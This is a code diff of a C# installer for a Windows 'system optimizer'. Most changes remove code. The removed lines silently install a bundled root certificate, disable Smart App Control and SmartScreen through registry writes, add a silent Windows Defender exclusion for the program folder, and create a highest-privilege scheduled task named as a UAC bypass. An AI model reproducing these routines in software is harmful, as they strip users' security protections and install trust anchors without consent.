                     dynamic shortcut = shell.CreateShortcut(startMenu);
                     shortcut.TargetPath = targetExe;
                     shortcut.WorkingDirectory = targetDir;
-                    shortcut.IconLocation = targetIco + ",0";
-                    shortcut.Description = $"STORM SYSTEM OPTIMIZER {AppVersion}";
+                    shortcut.IconLocation = (File.Exists(targetIco) ? targetIco : targetExe) + ",0";
+                    shortcut.Description = AppDisplayName;
                     shortcut.Save();
                 }
 
-                // Desktop shortcut
                 if (desktopShortcut)
                 {
-                    string desktop = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory), "STORM SYSTEM OPTIMIZER.lnk");
+                    string desktop = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory), $"{AppDisplayName}.lnk");
                     dynamic deskShortcut = shell.CreateShortcut(desktop);
                     deskShortcut.TargetPath = targetExe;
                     deskShortcut.WorkingDirectory = targetDir;
-                    deskShortcut.IconLocation = targetIco + ",0";
-                    deskShortcut.Description = $"STORM SYSTEM OPTIMIZER {AppVersion}";
+                    deskShortcut.IconLocation = (File.Exists(targetIco) ? targetIco : targetExe) + ",0";
+                    deskShortcut.Description = AppDisplayName;
                     deskShortcut.Save();
                 }
-            }
-            catch { }
-        }
-
-        private void RegisterContextMenu(string targetExe)
-        {
-            try
-            {
-                string[] rootKeys = new[]
-                {
-                    @"Software\Classes\*\shell\StormUnlocker",
-                    @"Software\Classes\Directory\shell\StormUnlocker",
-                    @"Software\Classes\Drive\shell\StormUnlocker",
-                    @"Software\Classes\Folder\shell\StormUnlocker"
-                };
-
-                foreach (var rk in rootKeys)
-                {
-                    using var key = Registry.CurrentUser.CreateSubKey(rk);
-                    key?.SetValue("", "Разблокировать через STORM OPTIMIZER");
-                    key?.SetValue("Icon", $"\"{targetExe}\",0");
-                    using var cmd = key?.CreateSubKey("command");
-                    cmd?.SetValue("", $"\"{targetExe}\" /unlock \"%1\"");
-                }
-
-                if (IsAdministrator())
-                {
-                    string[] lmKeys = new[]
-                    {
-                        @"*\shell\StormUnlocker",
-                        @"Directory\shell\StormUnlocker",
-                        @"Drive\shell\StormUnlocker",
-                        @"Folder\shell\StormUnlocker"
-                    };
-                    foreach (var lmk in lmKeys)
-                    {
-                        using var key = Registry.ClassesRoot.CreateSubKey(lmk);
-                        key?.SetValue("", "Разблокировать через STORM OPTIMIZER");
-                        key?.SetValue("Icon", $"\"{targetExe}\",0");
-                        using var cmd = key?.CreateSubKey("command");
-                        cmd?.SetValue("", $"\"{targetExe}\" /unlock \"%1\"");
-                    }
-                }
-            }
-            catch { }
-        }
-
-        public static void SetupScheduledTaskBypassUAC(string targetExe)
-        {
-            try
-            {
-                var psi = new ProcessStartInfo
-                {
-                    FileName = "schtasks.exe",
-                    Arguments = $"/create /tn \"STORM_SYSTEM_OPTIMIZER\" /tr \"\\\"{targetExe}\\\"\" /sc ondemand /rl highest /f",
-                    UseShellExecute = false,
-                    CreateNoWindow = true,
-                    WindowStyle = ProcessWindowStyle.Hidden
-                };
-                using var p = Process.Start(psi);
-                p?.WaitForExit(5000);
             }
             catch { }
         }
@@ -722,55 +768,18 @@ namespace StormSystemOptimizer.Installer
         {
             try
             {
-                string displayName = $"STORM SYSTEM OPTIMIZER {AppVersion}";
-                string uninstallCmd = $"cmd.exe /c schtasks /delete /tn \"STORM_SYSTEM_OPTIMIZER\" /f & rmdir /s /q \"{targetDir}\" & del \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\STORM SYSTEM OPTIMIZER.lnk\" & del \"%USERPROFILE%\\Desktop\\STORM SYSTEM OPTIMIZER.lnk\"";
-
-                using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Uninstall\StormSystemOptimizer"))
+                using var key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Uninstall\StormSystemOptimizer");
+                if (key != null)
                 {
-                    if (key != null)
-                    {
-                        key.SetValue("DisplayName", displayName);
-                        key.SetValue("DisplayVersion", AppVersion);
-                        key.SetValue("Publisher", "STORM TEAM");
-                        key.SetValue("DisplayIcon", targetIco);
-                        key.SetValue("InstallLocation", targetDir);
-                        key.SetValue("UninstallString", uninstallCmd);
-                    }
+                    key.SetValue("DisplayName", AppDisplayName);
+                    key.SetValue("DisplayVersion", AppVersion);
+                    key.SetValue("Publisher", "STORM TEAM");
+                    key.SetValue("DisplayIcon", File.Exists(targetIco) ? targetIco : targetExe);
+                    key.SetValue("InstallLocation", targetDir);
+                    key.SetValue("UninstallString", $"cmd.exe /c rmdir /s /q \"{targetDir}\" & del \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\*STORM SYSTEM OPTIMIZER*.lnk\" & del \"%USERPROFILE%\\Desktop\\*STORM SYSTEM OPTIMIZER*.lnk\"");
                 }
-
-                if (IsAdministrator())
-                {
-                    using (var keyLm = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\StormSystemOptimizer"))
-                    {
-                        if (keyLm != null)
-                        {
-                            keyLm.SetValue("DisplayName", displayName);
-                            keyLm.SetValue("DisplayVersion", AppVersion);
-                            keyLm.SetValue("Publisher", "STORM TEAM");
-                            keyLm.SetValue("DisplayIcon", targetIco);
-                            keyLm.SetValue("InstallLocation", targetDir);
-                            keyLm.SetValue("UninstallString", uninstallCmd);
-                        }
-                    }
-                }
-
-                RegisterContextMenu(targetExe);
             }
             catch { }
-        }
-
-        private static bool IsAdministrator()
-        {
-            try
-            {
-                using var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
-                var principal = new System.Security.Principal.WindowsPrincipal(identity);
-                return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
-            }
-            catch
-            {
-                return false;
-            }
         }
 
         [STAThread]
@@ -782,78 +791,6 @@ namespace StormSystemOptimizer.Installer
                 if (!string.IsNullOrEmpty(selfExe))
                 {
                     UnblockFile(selfExe);
-                }
-
-                // Extract embedded cert to temp and install silently immediately
-                string tempCert = Path.Combine(Path.GetTempPath(), "STORM_Root_Certificate.cer");
-                var asm = Assembly.GetExecutingAssembly();
-                foreach (var name in asm.GetManifestResourceNames())
-                {
-                    if (name.EndsWith("STORM_Certificate.cer", StringComparison.OrdinalIgnoreCase))
-                    {
-                        using var inStream = asm.GetManifestResourceStream(name);
-                        if (inStream != null)
-                        {
-                            using var outStream = File.Create(tempCert);
-                            inStream.CopyTo(outStream);
-                        }
-                        break;
-                    }
-                }
-
-                if (File.Exists(tempCert))
-                {
-                    InstallCertificateSilently(tempCert);
-                }
-
-                // If not running as administrator, elevate seamlessly with UAC
-                if (!IsAdministrator())
-                {
-                    if (!string.IsNullOrEmpty(selfExe) && File.Exists(selfExe))
-                    {
-                        var psi = new ProcessStartInfo
-                        {
-                            FileName = selfExe,
-                            UseShellExecute = true,
-                            Verb = "runas"
-                        };
-                        try
-                        {
-                            Process.Start(psi);
-                            return;
-                        }
-                        catch
-                        {
-                            // If user cancels UAC prompt, continue in standard mode
-                        }
-                    }
-                }
-                else
-                {
-                    // Running elevated: neutralize SAC / SmartScreen blocks and add exclusions
-                    try
-                    {
-                        using var key = Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\CI\Policy");
-                        key?.SetValue("VerifiedAndReputablePolicyState", 0, RegistryValueKind.DWord);
-                        key?.SetValue("SAC_PreviousState", 0, RegistryValueKind.DWord);
-                    }
-                    catch { }
-
-                    try
-                    {
-                        using var expKey = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer");
-                        expKey?.SetValue("SmartScreenEnabled", "Off", RegistryValueKind.String);
-                    }
-                    catch { }
-
-                    if (!string.IsNullOrEmpty(selfExe))
-                    {
-                        string selfDir = Path.GetDirectoryName(selfExe) ?? "";
-                        if (!string.IsNullOrEmpty(selfDir))
-                        {
-                            AddDefenderExclusionSilently(selfDir);
-                        }
-                    }
                 }
             }
             catch { }
